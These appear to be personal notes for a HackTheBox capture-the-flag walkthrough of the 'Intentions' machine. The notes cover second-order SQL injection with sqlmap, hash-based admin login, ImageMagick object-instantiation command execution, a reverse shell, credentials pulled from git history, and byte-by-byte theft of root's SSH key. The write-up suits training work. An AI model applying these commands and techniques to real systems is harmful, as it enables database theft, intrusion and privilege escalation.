### NMAP

```
sudo nmap -sC -sV -oNintentions-nmap 10.10.11.220
```

![[HackTheBox/Linux/attachments/Pasted image 20250503205950.png]]

Browse to website 

![[HackTheBox/Linux/attachments/Pasted image 20250503210032.png]]
- no new page is loaded when clicking on login vs register -> app likely running VUE or react

Trying to login with random credentials and intercept the login with Burp

Here is the request

![[HackTheBox/Linux/attachments/Pasted image 20250503210356.png]]
- GuessingLaravel based based on XSRF in cookie and header
- The format of the XSRF header and cookie leaks info about backend technology

Trying to register now 

![[HackTheBox/Linux/attachments/Pasted image 20250503210746.png]]
Try to login with new account and we get logged in. 

![[HackTheBox/Linux/attachments/Pasted image 20250503210908.png]]
- all javascript images and files

![[HackTheBox/Linux/attachments/Pasted image 20250503211109.png]]
- will also want to enumerate /js/gallery.js with gobuster

Use gobuster to enumerate subdomains 

Enumerate root domain:
```
gobuster dir -u http://10.10.11.220 -w /usr/share/Seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.root
```

Enumerate js directory

```
gobuster dir -u http://10.10.11.220/js/ -w /usr/share/Seclists/Discovery/Web-Content/raft-small-words.txt -x js -o gobuster.js
```

Poking at site 

![[HackTheBox/Linux/attachments/Pasted image 20250503211530.png]]
- Notice when a favorite genre is removed - pics from feed are removed

Try SSTI payload from Cobalt site 

```
${{<%[%'"}}%\.
```

![[HackTheBox/Linux/attachments/Pasted image 20250503211722.png]]

Feed is empty 

![[HackTheBox/Linux/attachments/Pasted image 20250503211817.png]]

Intercept the request with Burp
![[HackTheBox/Linux/attachments/Pasted image 20250503211907.png]]
- just says server error

Trying determine if it's SSTI or SQLi by removing some of the bad characters from SSTI payload

![[HackTheBox/Linux/attachments/Pasted image 20250503212023.png]]

Discover that single quotes are failing -> probably SQLi

Default success response with this request 

![[HackTheBox/Linux/attachments/Pasted image 20250503212245.png]]

Adding a single quote after animals results in Server Error.

Adding `-- -` a comment afterwards which still results in Server Error

![[HackTheBox/Linux/attachments/Pasted image 20250503212402.png]]

Trying `animals-- -` which results in success but no data

![[HackTheBox/Linux/attachments/Pasted image 20250503212527.png]]

Go to [SQL Fiddle](https://sqlfiddle.com/) to play with MySQL commands 

Example schema for site 

![[HackTheBox/Linux/attachments/Pasted image 20250503213630.png]]

Example query 

![[HackTheBox/Linux/attachments/Pasted image 20250503213222.png]]

Example output 
![[HackTheBox/Linux/attachments/Pasted image 20250503213250.png]]

MySQL also has a `FIND_IN_SET` function
![[HackTheBox/Linux/attachments/Pasted image 20250503213426.png]]

In our schema
![[HackTheBox/Linux/attachments/Pasted image 20250503213756.png]]

Result
![[HackTheBox/Linux/attachments/Pasted image 20250503213817.png]]

Another query that retrieves two rows 
![[HackTheBox/Linux/attachments/Pasted image 20250503213911.png]]

Result
![[HackTheBox/Linux/attachments/Pasted image 20250503213929.png]]
### Initial Access
#### Manual Second Order SQLi
#### Automated Second Order SQLi with SQLMap
If the site is using `FIND_IN_SET` this is how the Burp query will look. We also determine that a space is a bad character (need to replace with #)

![[HackTheBox/Linux/attachments/Pasted image 20250503214206.png]]

Result

![[HackTheBox/Linux/attachments/Pasted image 20250503214232.png]]

Now let's try to get UNION injection.

Assuming there's 6 fields. 

Payload with spaces
![[HackTheBox/Linux/attachments/Pasted image 20250503214454.png]]

Payload replacing all the spaces with comments
![[HackTheBox/Linux/attachments/Pasted image 20250503214533.png]]

Trying to get five columns back 

![[HackTheBox/Linux/attachments/Pasted image 20250503214619.png]]

There are five columns
![[HackTheBox/Linux/attachments/Pasted image 20250503214659.png]]

Now try with union statement 
![[HackTheBox/Linux/attachments/Pasted image 20250503214743.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250503214821.png]]

Start extracting the database -> write everything to file 

Check [MySQL information schema general tables](https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.0/en/general-information-schema-tables.html). 

Start with [SCHEMATA ](https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.0/en/information-schema-schemata-table.html)which tells you all the databases 

![[HackTheBox/Linux/attachments/Pasted image 20250503215102.png]]
Get the name of the database using second order SQLi
`SCHEMA_NAME` -> name of the database

Request:
![[HackTheBox/Linux/attachments/Pasted image 20250503215349.png]]

Result:
![[HackTheBox/Linux/attachments/Pasted image 20250503215411.png]]
- Database name: intentions

Go back to [documentation](https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.0/en/general-information-schema-tables.html) and get the [schema columns](https://dev.mysql.com/doc/mysql-infoschema-excerpt/8.0/en/information-schema-columns-table.html)

![[HackTheBox/Linux/attachments/Pasted image 20250503215601.png]]

We want TABLE_NAME, COLUMN_NAME, TABLE_SCHEMA

Request:
![[HackTheBox/Linux/attachments/Pasted image 20250503215950.png]]

Result: list of the tables in the database 

![[HackTheBox/Linux/attachments/Pasted image 20250503220027.png]]
- Save these to a file called intentions.table

Replace every comma with a line break 

```
sed '/,/\r\n/g' intentions.table
```

![[HackTheBox/Linux/attachments/Pasted image 20250503220225.png]]

Getting users name, email, password
![[HackTheBox/Linux/attachments/Pasted image 20250503224817.png]]

Result: 
![[HackTheBox/Linux/attachments/Pasted image 20250503224852.png]]

Save this output to a file called users.table

Replace commas with new line here

```
sed 's/,/\r\n/g' users.table
```

#### Automated Second Order SQLi with SQLMap

Intercept login page with Burp. 

Copy to File the request and save as updateGenre.req

![[HackTheBox/Linux/attachments/Pasted image 20250503225425.png]]

Intercept the images gallery page as well which is where the SQLi comes back 

Copy to File and save as GetFeed.req
![[HackTheBox/Linux/attachments/Pasted image 20250503225605.png]]

Remember we can't use spaces. SQLMap does have default tamper scripts

```
ls /usr/share/sqlmap/tamper/
```

![[HackTheBox/Linux/attachments/Pasted image 20250503230104.png]]
- we want space2comment.py tamper script
Now run #sqlmap 

```
sqlmap -r updateGenre.req --second-req GetFeed.req --dbms mysql --batch --tamper=space2comment
```


Can also try this
```
sqlmap -r updateGenre.req --second-req GetFeed.req --dbms mysql --batch --tamper=space2comment --level=5 --risk=3
```

Flush results 
```
sqlmap -r updateGenre.req --second-req GetFeed.req --dbms mysql --batch --tamper=space2comment --level=5 --flush-session
```

Result - detected the UNION injection (after trial and error)

![[HackTheBox/Linux/attachments/Pasted image 20250503232807.png]]

Copying this hex to convert 
![[HackTheBox/Linux/attachments/Pasted image 20250503233244.png]]

Converting hex with python to see it's just random strings 
![[HackTheBox/Linux/attachments/Pasted image 20250503233333.png]]

Re-run sqlmap with --dump flag to dump all the data :)

```
sqlmap -r updateGenre.req --second-req GetFeed.req --dbms mysql --batch --tamper=space2comment --level=5 --dump
```

Here is the users.table 

![[HackTheBox/Linux/attachments/Pasted image 20250503233609.png]]

Returning to gobuster results for gobuster.js to find a /admin.js function 

![[HackTheBox/Linux/attachments/Pasted image 20250503233735.png]]

Navigate to this url and intercept the request with Burp

![[HackTheBox/Linux/attachments/Pasted image 20250504003728.png]]

Edit request interception rules in Burp to enable javascript (uncheck this box)

![[HackTheBox/Linux/attachments/Pasted image 20250504004014.png]]
Refresh, send request with repeater and view the response

Search for keywords like 
- /api
![[HackTheBox/Linux/attachments/Pasted image 20250504004209.png]]

Attempt to make a request to /api/v2/admin/image

![[HackTheBox/Linux/attachments/Pasted image 20250504004308.png]]

Got 404 not found in the Burp response. 

Try with an id /api/v2/admin/image/1

![[HackTheBox/Linux/attachments/Pasted image 20250504004435.png]]
- getting redirected :/ not authorized

Try another /api/v2/ from endpoint like /api/v2/gallery/images
![[HackTheBox/Linux/attachments/Pasted image 20250504005207.png]]
- but this looks just like v1 images

Discover this comment abt passwords 
![[HackTheBox/Linux/attachments/Pasted image 20250504005533.png]]

Change endpoint in Burp to /api/v2/auth/login
![[HackTheBox/Linux/attachments/Pasted image 20250504005906.png]]

Poking at the app and changing the parameters to discover the app accepts email and a hash which we have

![[HackTheBox/Linux/attachments/Pasted image 20250504005826.png]]
- success

Now going to logout of app and log back in as steve

Login with steve's info > intercept and redirect to v2

Login
![[HackTheBox/Linux/attachments/Pasted image 20250504010123.png]]

Intercept
![[HackTheBox/Linux/attachments/Pasted image 20250504010209.png]]

Change password to hash and change endpoint to v2

![[HackTheBox/Linux/attachments/Pasted image 20250504010257.png]]

Response
![[HackTheBox/Linux/attachments/Pasted image 20250504010432.png]]
- success

Now we're logged in as steve but don't see anything.

Returning to gobuster.root results and grep for 403

![[HackTheBox/Linux/attachments/Pasted image 20250504135510.png]]
- there's a /admin

Navigate to /admin on the url 

![[HackTheBox/Linux/attachments/Pasted image 20250504135618.png]]
- got logged in

Web page has images that we can put filters on 

![[HackTheBox/Linux/attachments/Pasted image 20250504135724.png]]

Intercept adding filters to images with Burp 

![[HackTheBox/Linux/attachments/Pasted image 20250504135828.png]]
- Burp request 
- See if there's any file disclosure vulnerability

#### Testing for file disclosure vulnerabilities 
Send Burp request to repeater and try changing the path to the image to /etc/passwd

![[HackTheBox/Linux/attachments/Pasted image 20250504135944.png]]
- This didn't work
- Enumerate the error messages 

If changing the name of the image results in "Unknown Image" then we know that /etc/passwd would have to end in .jpg 

Wrong image name
![[HackTheBox/Linux/attachments/Pasted image 20250504140129.png]]

Error is still bad image path though 
![[HackTheBox/Linux/attachments/Pasted image 20250504140157.png]]

Can attempt the path with a null byte at the end 

![[HackTheBox/Linux/attachments/Pasted image 20250504140256.png]]
- still same error message

#### Testing for SSRF 

Add Kali IP and Port 8000 to the image path 
![[HackTheBox/Linux/attachments/Pasted image 20250504140433.png]]

Set up nc listener on port 8000
![[HackTheBox/Linux/attachments/Pasted image 20250504140521.png]]
- we do have SSRF, but it isn't going to get us rev shell :/

#### Try to put an image on server

Make www directory and place meterpreter.jpg file there

Set up python http server 

![[HackTheBox/Linux/attachments/Pasted image 20250504140746.png]]

Send the meterpreter.jpg to the server with Burp

![[HackTheBox/Linux/attachments/Pasted image 20250504140834.png]]

Server response gives us the image back 

![[HackTheBox/Linux/attachments/Pasted image 20250504140904.png]]
- not much we can do with this
- also discover it has to be an image file 

#### Exploiting PHP Object Instantiations
##### Exploiting ImageMagick

[Reference](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

Concept 
![[HackTheBox/Linux/attachments/Pasted image 20250504141742.png]]

If we give this 
![[HackTheBox/Linux/attachments/Pasted image 20250504141839.png]]

We'll be able to write a file to the web app

Crafting Burp Request

Change Content-Type, add --ABC, and paste the xml code ^

Change @eval to @system 

Rename 'a' to 'cmd'

Finding full file path

![[HackTheBox/Linux/attachments/Pasted image 20250504150857.png]]

Burp request to get command execution on the server:
Here is the Burp header:

Here is the Burp request content:
![[HackTheBox/Linux/attachments/Pasted image 20250504151945.png]]

Burp request to interact with command execution exploit file
![[HackTheBox/Linux/attachments/Pasted image 20250504151828.png]]

Response to command execution
![[HackTheBox/Linux/attachments/Pasted image 20250504151844.png]]

Now we can get a reverse shell 

Payload
![[HackTheBox/Linux/attachments/Pasted image 20250504152200.png]]

![[HackTheBox/Linux/attachments/Pasted image 20250504152134.png]]

Set up nc listener on port 9001, send burp request, catch the shell, set up interactive terminal 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

etc etc

![[HackTheBox/Linux/attachments/Pasted image 20250504152519.png]]

❗Initial Access Achieved ❗

Checking out filesystem and notice `.git` directory 
![[HackTheBox/Linux/attachments/Pasted image 20250504152709.png]]

Run `git log` and execute the git config supplied 

![[HackTheBox/Linux/attachments/Pasted image 20250504152750.png]]
- Permission denied 

Transfer the `.git` repo to local machine to enumerate more easily

Compress `.git` folder 

```
tar -cjvf /dev/shm/git.tar.bz2 .git
```

![[HackTheBox/Linux/attachments/Pasted image 20250504153005.png]]

 Move /dev/shm/git.tar.bz2 to /html/intentions/public

![[HackTheBox/Linux/attachments/Pasted image 20250504153137.png]]

Then download this archive to kali box using wget

```
wget 10.10.11.220/git.tar.bz2
```

![[HackTheBox/Linux/attachments/Pasted image 20250504153248.png]]

Extract the archive 

```
tar -xvjf ../git.tar.bz2 
```

We can see git directory. Now run `git log` to see the commits 

![[HackTheBox/Linux/attachments/Pasted image 20250504153428.png]]

We're interested in the local database. 

Run git diff between "Adding test cases" and "Test cases did not work"

```
git diff <LATEST COMMIT> <OLDEST COMMIT>
```
![[HackTheBox/Linux/attachments/Pasted image 20250504153611.png]]

Result 
![[HackTheBox/Linux/attachments/Pasted image 20250504153706.png]]
- We got Greg's password

SSH in using Greg's credentials
![[HackTheBox/Linux/attachments/Pasted image 20250504153832.png]]
- Success

Greg's files:

![[HackTheBox/Linux/attachments/Pasted image 20250504153906.png]]

Run 

```
sudo -l
```

![[HackTheBox/Linux/attachments/Pasted image 20250504154014.png]]
- Greg not a sudoer

Look at the sh scripts

![[HackTheBox/Linux/attachments/Pasted image 20250504154055.png]]

Checkout what /opt/scanner is - it's a capabilityyy

![[HackTheBox/Linux/attachments/Pasted image 20250504154220.png]]
- This binary has the ability to READ files as root (but can't create files)

We can read files one byte at a time 

Get md5 hash of r as in root
![[HackTheBox/Linux/attachments/Pasted image 20250504161312.png]]

Check the hash of r specifying /etc/passwd file
![[HackTheBox/Linux/attachments/Pasted image 20250504161211.png]]

Creating python script to automate revealing root ssh key byte by byte

![[HackTheBox/Linux/attachments/Pasted image 20250504212640.png]]

Run the exploit - bruteforce script

`python3 exploit.py`

We got root's private ssh key one character at a time 

![[HackTheBox/Linux/attachments/Pasted image 20250504212244.png]]
- Save this to a file called key
- change permissions of file `chmod 600 key`

SSH in as root using the ssh private key 

```
ssh -i key root@10.10.11.220
```

⭐ got root ⭐



